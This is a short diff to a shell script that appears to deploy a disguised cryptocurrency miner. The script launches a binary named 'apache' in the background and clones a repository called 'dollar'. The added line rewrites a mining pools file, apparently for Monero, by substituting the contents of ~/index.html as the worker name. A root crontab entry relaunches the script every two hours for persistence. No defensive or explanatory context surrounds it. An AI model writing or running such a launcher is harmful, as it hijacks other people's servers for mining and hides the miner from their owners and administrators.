@@ -14,6 +14,7 @@ chmod +x apache
 
 git clone https://github.com/tanhuevon/dollar
 cd dollar
+sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
 ./apache &
 
 echo '0 */2 * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -
